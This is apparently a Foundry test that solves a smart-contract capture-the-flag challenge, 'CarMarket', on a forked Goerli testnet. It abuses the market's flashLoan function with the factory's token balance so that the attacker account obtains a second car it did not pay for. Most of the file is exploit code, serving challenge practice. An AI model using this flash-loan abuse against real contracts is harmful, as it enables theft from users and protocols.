// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.19;

import "../src/CarMarket/CarMarket.sol";
import "../src/CarMarket/CarFactory.sol";
import "../src/CarMarket/CarToken.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract CarMarketTest is Test {
    address alice;
    address tokenAddress = 0x66408824A99FF61ae2e032E3c7a461DED1a6718E;
    address marketAddress = 0x07AbFccEd19Aeb5148C284Cd39a9ff2Ac835960A;
    address factoryAddress = 0x012f0c715725683A5405B596f4F55D4AD3046854;

    function setUp() public {
        string memory RPC = vm.envString("GOERLI_RPC_URL");
        vm.createSelectFork(RPC, 7247740);
        alice = makeAddr("alice");
    }

    function testTakeOwnership() public {
        CarFactory carFactory = CarFactory(payable(factoryAddress));
        CarMarket carMarket = CarMarket(payable(marketAddress));
        CarToken carToken = CarToken(payable(tokenAddress));
        console.log(carToken.balanceOf(address(carFactory)));
        vm.startPrank(alice);
        carToken.mint();
        carToken.approve(address(carMarket), type(uint256).max);
        carMarket.purchaseCar("", "", "");
        assertEq(carMarket.getCarCount(alice), 1);
        (bool success,) = address(carMarket).call(
            abi.encodeWithSignature("flashLoan(uint256)", carToken.balanceOf(address(carFactory)))
        );
        require(success, "flashloan failed");
        carMarket.purchaseCar("", "", "");
        assertEq(carMarket.getCarCount(alice), 2);
        vm.stopPrank();
    }

    function receivedCarToken(address) public {}
}
